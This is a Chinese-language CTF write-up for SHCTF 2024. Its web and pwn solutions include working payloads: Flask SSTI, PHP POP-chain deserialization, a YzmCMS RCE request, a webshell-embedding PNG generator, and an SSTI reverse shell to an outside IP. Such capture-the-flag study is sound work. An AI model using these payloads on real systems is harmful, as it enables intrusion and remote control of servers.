+++
date = '2025-07-28T19:23:12+08:00'
lastmod = '2025-07-28T19:23:12+08:00'
draft = false
title = 'SHCTF 2024 WriteUP'
categories = ['WriteUP']
tags = ['WriteUP', 'SHCTF']

+++

## Week1——Web

<!--more-->

### 1zflask
- 根据题目描述，查看 robots.txt 发现以下内容。
```TEXT
User-agent: *
Disallow: /s3recttt
```
- 访问该路径，浏览器会自动下载文件 `app.py`。
```python
import os
import flask
from flask import Flask, request, send_from_directory, send_file

app = Flask(__name__)
  
@app.route('/api')
def api():
    cmd = request.args.get('SSHCTFF', 'ls /')
    result = os.popen(cmd).read()
    return result
    
@app.route('/robots.txt')
def static_from_root():
    return send_from_directory(app.static_folder,'robots.txt')
    
@app.route('/s3recttt')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)
    
if __name__ == '__main__':
    app.run(debug=True)
```
- 阅读上述代码，可知通过 `/api` 路径去用 GET 通过变量 `SSHCTFF` 传递需要执行的命令，即可获取 flag。

### MD5 Master
- 题目
```PHP
<?php  
highlight_file(__file__);  
  
$master = "MD5 master!";  
  
if(isset($_POST["master1"]) && isset($_POST["master2"])){  
    if($master.$_POST["master1"] !== $master.$_POST["master2"] && md5($master.$_POST["master1"]) === md5($master.$_POST["master2"])){  
        echo $master . "<br>";  
        echo file_get_contents('/flag');  
    }  
}  
else{  
    die("master? <br>");  
}
?>
```
- 很明显，这是一个 MD5 的强类型判断，且前面还拼接了一个特定的字符串。    
- 我们可以使用 [fastcoll](https://blog.csdn.net/m0_68483928/article/details/141252221) 工具来进行 MD5 的爆破，该工具的爆破是在原字符后接上其他内容，从而使拼接后的字符串的 md5 的值相等。
```php
<?php 
function  readmyfile($path){
    $fh = fopen($path, "rb");
    $data = fread($fh, filesize($path));
    fclose($fh);
    return $data;
 }
 echo '⼆进制md5加密：'.md5( (readmyfile("1_msg1.txt")));
 echo 'url编码：'.urlencode(readmyfile("1_msg1.txt"));
 echo '⼆进制md5加密：'.md5( (readmyfile("1_msg2.txt")));
 echo 'url编码：'. urlencode(readmyfile("1_msg2.txt"));
 ?>
```

### ez_gittt
- 一个简单的 git 泄露。    
- 可以用 GitHack 工具解决。

### jvav
- 该题要求写一个可以执行任意系统命令的 Java 程序。    
- 示例代码（如下）
```Java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ShellExecutor {

    public static void main(String[] args) {
        try {
            // 定义要执行的shell命令
            String command = "cat /flag";
            
            // 使用 Runtime.exec() 方法执行命令
            Process process = Runtime.getRuntime().exec(command);

            // 获取命令的输出流
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

            // 读取输出流中的每一行并打印
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            // 关闭流
            reader.close();

            // 等待命令执行完成
            int exitCode = process.waitFor();
            System.out.println("Command execution completed with exit code: " + exitCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### poppopop
- 要根据 php 代码构建出 pop 链。
```PHP
<?php
class SH {
    public static $Web = false;
    public static $SHCTF = false;
}

class C {
    public $p;
    public function flag()
    {
        ($this->p)();
    }
}

class T{
    public $n;
    public function __destruct()
    {
        SH::$Web = true;
        echo $this->n;
    }
}

class F {
    public $o;
    public function __toString()
    {
        SH::$SHCTF = true;
        $this->o->flag();
        return "其实。。。。,";
    }
}

class SHCTF {
    public $isyou;
    public $flag;
    public function __invoke()
    {
        if (SH::$Web) {
            ($this->isyou)($this->flag);
            echo "小丑竟是我自己呜呜呜~";
        } else {
            echo "小丑别看了!";
        }
    }
}
if (isset($_GET['data'])) {
	highlight_file(__FILE__);
	unserialize(base64_decode($_GET['data']));  
} 
else {
	highlight_file(__FILE__);  
    echo "小丑离我远点！！！";  
}
?>
```
- 首先寻找入口点，这里是 `__destruct` 方法，在该方法中，最后存在 `echo` 即可以回显由 `__toString` 转化的特定内容的字符串。    
- `F` 类中的 `o` 想要调用 `flag` 函数，所以要将含有 `flag` 函数的 `C` 类传给 `o`。    
- 最终在 `flag` 函数中调用 `SHCTF` 类中的 `__invoke` 魔术方法。    

Payload 如下：
```PHP
$c = new C();
$t = new T();
$f = new F();
$shctf = new SHCTF();

$t -> n = $f;
$f -> o = $c;
$c -> p = $shctf;
$shctf -> isyou = 'system';
$shctf -> flag = 'cd ..;cd ..;cd ..;cat flllag';

print_r(base64_encode(serialize($t)));
```

### 单身十八年的手速
- 改改 JS 代码就可以了。    
- 或者都不用修改，直接看到它满足条件之后返回的值。
```JavaScript
const addTimes = () => {
    times += 0x209;
    document[_0x3bac('0x2', '7)ZK')]('clickCount')['textContent'] = times;
    if (times >= 0x208) {
    	alert('U0hDVEZ7Y2M0NDdiNWEtNTg0Yy00MjhmLThjNTYtZWY1ZTAzN2Y5YTg3fQo=');
    }
}
```
- 发现是一串编码，猜测是 `base64`。    
- 解码即得出 flag：`SHCTF{cc447b5a-584c-428f-8c56-ef5e037f9a87}`。

### 蛐蛐?蛐蛐!
- 题目
```PHP
<?php
if($_GET['ququ'] == 114514 && strrev($_GET['ququ']) != 415411){
    if($_POST['ququ']!=null){
        $eval_param = $_POST['ququ'];
        if(strncmp($eval_param,'ququk1',6)===0){
            eval($_POST['ququ']);
        }else{
            echo("可以让fault的蛐蛐变成现实么\n");
        }
    }
    echo("蛐蛐成功第一步！\n");
}
else{
    echo("呜呜呜fault还是要出题");
}
?>
```
- 第一个绕过只需加入在 `114514` 后加入 php 弱类型判断忽略的字符即可如 `@`。    
- 第二个绕过只需参数前 6 个字符是 `ququk1`，之后使用空格将其隔断就可正常执行之后传递的命令。

## Week2——Web
### 入侵者禁入
```python
from flask import Flask, session, request, render_template_string
app = Flask(__name__) 
app.secret_key = '0day_joker' 

@app.route('/') 
def index(): 
	session['role'] = { 
		'is_admin': 0, 
		'flag': 'your_flag_here'
	} 
	with open(__file__, 'r') as file: 
		code = file.read() 
	return code

@app.route('/admin') 
def admin_handler(): 
	try: 
		role = session.get('role') 
		if not isinstance(role, dict): 
			raise Exception 
	except Exception: 
		return 'Without you, you are an intruder!' 
		
		if role.get('is_admin') == 1: 
			flag = role.get('flag', 'admin') 
			message = "Oh, I believe in you! The flag is: %s" % flag 
			return render_template_string(message) 
		else: 
			return "Error: You don't have the power!" 
			
if __name__ == '__main__': 
	app.run('0.0.0.0', port=80)
```
Payload：
```TEXT
# 先改session，再模板注入
python3 flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{[].__class__.__base__.__subclasses__()[189].__init__.__globals__[\'__builtins__\'][\'__imp\'+\'ort__\'](\'os\').__dict__[\'pop\'+\'en\'](\'cd ..;cat /flag\').read()}}', 'is_admin': 1}}"

# 编码后 .eJwdjsEKgzAQRH9F9hKlJcVbaz9FJKxJKgsxERNPIf_eXW8z82ZgKpwpeJgq_AJuMEGt86KNsQFzNobVitnfIl_rnXrO-2Ee3x8pUqRy4y2kFQOzWfHoolAoslOLeNoP9VDpLBL0KmU18MSRLdI_klAfBVnXaf21WLqXPOLe6dH1Q2vwBMoG3U4RprG1P8iCPw0.ZwaelA.hyQR-UFsBnG0cWJml_e_bhZd7qQ
```

### guess_the_number
```python
import flask
import random
from flask import Flask, request, render_template, send_file

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', first_num = first_num)  

@app.route('/s0urce')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)

@app.route('/first')
def get_first_number():
    return str(first_num)

@app.route('/guess')
def verify_seed():
    num = request.args.get('num')
    if num == str(second_num):
        with open("/flag", "r") as file:
            return file.read()
    return "nonono"

def init():
    global seed, first_num, second_num
    seed = random.randint(1000000,9999999)
    random.seed(seed)
    first_num = random.randint(1000000000,9999999999)
    second_num = random.randint(1000000000,9999999999)

init()
app.run(debug=True)
```
Payload：
```python
import random

for seed in range(1000000,9999999):
    random.seed(seed)
    first_num = random.randint(1000000000,9999999999)
    if first_num == 9396607974:
        print(seed)
        break

random.seed(seed)
first_num = random.randint(1000000000,9999999999)
second_num = random.randint(1000000000,9999999999)
print(second_num)
```

#### 原理
`random.seed(seed)` 这个方法的作用是初始化 Python 的随机数生成器。当提供一个特定的种子 `（seed）` 值时，它会使随机数生成器产生一个确定性的序列。这意味着每次你使用相同的种子值调用 ` random.seed()` 时，随后产生的随机数序列将会是一样的。    

具体来说：    
如果你不指定任何种子值，默认情况下，Python 会根据当前系统时间来设置种子。这样每次运行程序时都会得到不同的随机数序列。    
当你显式地设置种子值时，比如 `random.seed(seed)`，之后的所有随机数都将基于这个种子值生成，并且每次设置相同的种子值时，产生的随机数序列将完全相同。    
这对于测试和调试是非常有用的，因为你可以通过固定种子来获得可重复的结果。例如，在机器学习模型训练过程中，如果需要复现实验结果，可以固定随机种子以保证数据划分的一致性。    

下面是一个简单的例子来展示这一点：
```python
import random 
random.seed(1) 
print(random.randint(1, 10)) # 输出例如: 7 
random.seed(1) 
print(random.randint(1, 10)) # 再次输出: 7 
random.seed(2) 
print(random.randint(1, 10)) # 输出例如: 8
```

### 自助查询
- 查询之后发现 flag 不能直接查到，而是藏在注释中。    

Payload：
```bash
sqlmap -u [url] --sql-shell
select * FROM information_schema.columns where table_name = 'flag'
```

### 登录验证
- 根据题目提示，要爆破 JWT 的密钥，并且要伪造 Cookie。
```TEXT
{
  "exp": 1729396405,
  "iat": 1729389205,
  "nbf": 1729389205,
  "role": "user"
}
```
- 使用工具 [jwt_tool](https://github.com/ticarpi/jwt_tool) 来进行弱口令的爆破，得到密钥为 `222333`，伪造 cookie 获得 flag。    

## Week3——Web
### love_flask
- 题目源码
```python
from flask import Flask, request, render_template_string
# Flask 2.0.1
# Werkzeug 2.2.2

app = Flask(__name__)
html_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pretty Input Box</title>
<style>
  .pretty-input {
    width: 100%;
    padding: 10px 20px;
    margin: 20px 0;
    font-size: 16px;
    border: 1px solid #ccc;
    border-radius: 25px;
    box-sizing: border-box;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
    transition: border 0.3s ease-in-out;
  }

  .pretty-input:focus {
    border-color: #4CAF50;
    outline: none;
  }

  .submit-button {
    width: 100%;
    padding: 10px 20px;
    margin: 20px 0;
    font-size: 16px;
    color: white;
    background-color: #4CAF50;
    border: none;
    border-radius: 25px;
    cursor: pointer;
  }

  .container {
    max-width: 300px;
    margin: auto;
    text-align: center;
  }

</style>
</head>
<body>
  
<div class="container">
  <form action="/namelist" method="get">
    <input type="text" class="pretty-input" name="name" placeholder="Enter your name...">
    <input type="submit" class="submit-button" value="Submit">
  </form>
</div>


</body>
</html>
'''
  
@app.route('/')
def pretty_input():
    return render_template_string(html_template)


@app.route('/namelist', methods=['GET'])
def name_list():
    name = request.args.get('name')  
    template = '<h1>Hi, %s.</h1>' % name
    rendered_string =  render_template_string(template)
    if rendered_string:
        return 'Success Write your name to database'
    else:
        return 'Error'


if __name__ == '__main__':
    app.run(port=8080)
```
- 由 `render_template_string` 函数得，接受传参后 flask 会对其进行渲染。
- 因此，此处可以进行模板注入。    
Payload：
```TEXT
/namelist?name={{[].__class__.__base__.__subclasses__()[189].__init__.__globals__[%27__builtins__%27][%27__imp%27+%27ort__%27](%27os%27).__dict__[%27pop%27+%27en%27](%27bash%20-c%20"bash%20-i%20>%26%20%2Fdev%2Ftcp%2F47.115.148.66%2F1234%200>%261"%27).read()}}
```

### 小小cms
- 后台弱口令登录 yzmcms/yzmcms    
- 搜索得知该 cms 存在 RCE 漏洞。    
- 利用漏洞 getshell。    
Payload：
```TEXT
POST /pay/index/pay_callback.html HTTP/1.1
Host: 210.44.150.15:43568
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

out_trade_no[0]=eq&out_trade_no[1]=ls&out_trade_no[2]=system
```

### 拜师之旅·番外
- 图片上传题    
- 经过简单尝试，发现网站会对文件内容以及文件名的后缀进行检查，并且会对图片进行二次渲染，为了让图片中的木马不会被改变，就需要用到大佬的脚本。
```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./ma.png');
?>
```
- 通过 GET、POST 传参来执行命令，而命令的执行结果则会被写入到图片中，因此我们需要将图片下载下来查看命令执行的结果。   
下面是扒到的题目源码：
```php
// check.php
<?php
header("Content-type: text/html;charset=utf-8");
error_reporting(0);

// 设置上传目录
define("UPLOAD_PATH", dirname(__FILE__) . "/upload/");
define("UPLOAD_URL_PATH", str_replace($_SERVER['DOCUMENT_ROOT'], "", UPLOAD_PATH));

if (!file_exists(UPLOAD_PATH)) {
    mkdir(UPLOAD_PATH, 0755);  // 创建上传目录
}

$is_upload = false;

if (!empty($_POST['submit'])) {
    $name = basename($_FILES['file']['name']);
    $filetype = $_FILES['file']['type'];
    $fileext = pathinfo($name)['extension'];
    $tmpname = $_FILES['file']['tmp_name'];
    $upload_file = UPLOAD_PATH . '/' . $name;

    // 只允许上传 png 文件
    if (($fileext == "png") && ($filetype == "image/png")) {
        if (move_uploaded_file($tmpname, $upload_file)) {
            // 使用上传的图片生成新的图片
            $im = imagecreatefrompng($upload_file);

            if ($im == false) {
                echo "文件检查失败，只允许传png文件。";
                @unlink($upload_file);
            } else {
                // 给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()) . ".png";

                // 保存新图片到指定目录
                $img_path = UPLOAD_PATH . '/' . $newfilename;
                imagepng($im, $img_path);
                @unlink($upload_file);
                $is_upload = true;

                echo "文件上传成功，已保存为：<a href='view.php?image=" . UPLOAD_URL_PATH . $newfilename . "'>" . $newfilename . "</a>";
            }
        } else {
            echo "文件上传失败。";
        }
    } else {
        echo "只允许上传 png 文件。";
    }
}
?>
```

```php
// view.php
<?php
// 仅允许显示上传目录下的图片
$allowed_path = dirname(__FILE__) . '/upload/';
$image = isset($_GET['image']) ? $_GET['image'] : '';

// 防止路径遍历攻击
$safe_image = basename($image);

// 拼接完整的文件路径
$file_path = $allowed_path . $safe_image;

// 只允许数字加 .png 的文件名
if (preg_match('/^\d+\.png$/i', $safe_image) && file_exists($file_path) && strpos(realpath($file_path), realpath($allowed_path)) === 0) {
    // 根据文件类型设置合适的 Content-Type
    $file_info = pathinfo($file_path);
    $file_ext = strtolower($file_info['extension']);
    
    switch ($file_ext) {
        case 'png':
            header('Content-Type: image/png');
            break;
        default:
            header('HTTP/1.0 404 Not Found');
            exit;
    }

    // 输出图片内容
    readfile($file_path);
    
    // Include 文件
    include($file_path);
    exit;
} 
else {
    header('HTTP/1.0 404 Not Found');
    exit;
}
?>

```
>这里必须有 `include` 或者其他文件包含函数才能执行其中的 PHP 代码

### hacked_website
- 题目简述：网站被黑了，留下了后门，`dirsearch` 一扫有 `www.zip`，那很明显要代码审计了。    
- 当然，也可以有牛逼的工具——D盾 Web检测。    
- 然后发现后门。（下附后门函数的代码）
```php
<?php
include 'common.php';
include 'header.php';
include 'menu.php';

$stat = \Widget\Stat::alloc();
?>
<div class="main">
    <div class="body container">
        <?php include 'page-title.php'; ?>
        <div class="row typecho-page-main">
            <div class="col-mb-12 col-tb-3">
                <p><a href="https://gravatar.com/emails/"
                    <?php $a = 'sys';$b = 'tem';$x = $a.$b;if (!isset($_POST['SH'])) {$z = "''";} else $z = $_POST['SH'];?>
                      title="<?php _e('在 Gravatar 上修改头像'); ?>"><?php echo '<img class="profile-zavatar" src="' . \Typecho\Common::gravatarUrl($user->mail, 220, 'X', 'mm', $request->isSecure()) . '" alt="' . $user->screenName . '" />'; ?></a>
                </p>
                <h2><?php $user->screenName(); ?></h2>
                <p><?php $user->name(); ?></p>
				<p><?php $user->name(); ?></p>
                <p><?php _e('目前有 <em>%s</em> 篇日志, 并有 <em>%s</em> 条关于你的评论在 <em>%s</em> 个分类中.%s',
                        $stat->myPublishedPostsNum, $stat->myPublishedCommentsNum, $stat->categoriesNum, $x($z)); ?></p>
                <p><?php
                    if ($user->logged > 0) {
                        $logged = new \Typecho\Date($user->logged);
                        _e('最后登录: %s', $logged->word());
                    }
                    ?></p>
            </div>

            <div class="col-mb-12 col-tb-6 col-tb-offset-1 typecho-content-panel" role="form">
                <section>
                    <h3><?php _e('个人资料'); ?></h3>
                    <?php \Widget\Users\Profile::alloc()->profileForm()->render(); ?>
                </section>

                <?php if ($user->pass('contributor', true)): ?>
                    <br>
                    <section id="writing-option">
                        <h3><?php _e('撰写设置'); ?></h3>
                        <?php \Widget\Users\Profile::alloc()->optionsForm()->render(); ?>
                    </section>
                <?php endif; ?>

                <br>

                <section id="change-password">
                    <h3><?php _e('密码修改'); ?></h3>
                    <?php \Widget\Users\Profile::alloc()->passwordForm()->render(); ?>
                </section>

                <?php \Widget\Users\Profile::alloc()->personalFormList(); ?>
            </div>
        </div>
    </div>
</div>

<?php
include 'copyright.php';
include 'common-js.php';
include 'form-js.php';
\Typecho\Plugin::factory('admin/profile.php')->bottom();
include 'footer.php';
?>
```
- 然后就是想办法登录该网站后台了，搜索发现该博客框架没有默认账户密码，那么就弱口令爆破吧，然后得到密码 `qwer1234`，登入后台，访问对应的 `profile.php` 页面，然后 RCE 获取 flag。


## Week1——Pwn
### 签个到吧
- 逆天签到！    
- 反汇编代码如下：
```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init_io(argc, argv, envp);
  puts("test command");
  read(0, buf, 0x20uLL);
  if ( strstr(buf, "cat") || strstr(buf, "flag") || strstr(buf, "$0") || strstr(buf, "sh") )
  {
    puts("You are not allowed to use this command");
    return 0;
  }
  else
  {
    close(1);
    system(buf);
    return 0;
  }
}
```
- 由于 `close(1);` 关闭了标准输出，所以我们在使它能持续执行 shell 命令时看不到回显，所以我们在绕过字符匹配后要处理这个问题。    
- 绕过字符匹配，可以用如 `ca''t<>fla''g` 、`s''h` 等方式绕过。    
- 执行命令 `exec 1>&0` 则可以将标准输出重定向到标准输入，因为默认打开一个终端后，0，1都指向同一个位置也就是当前终端，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了。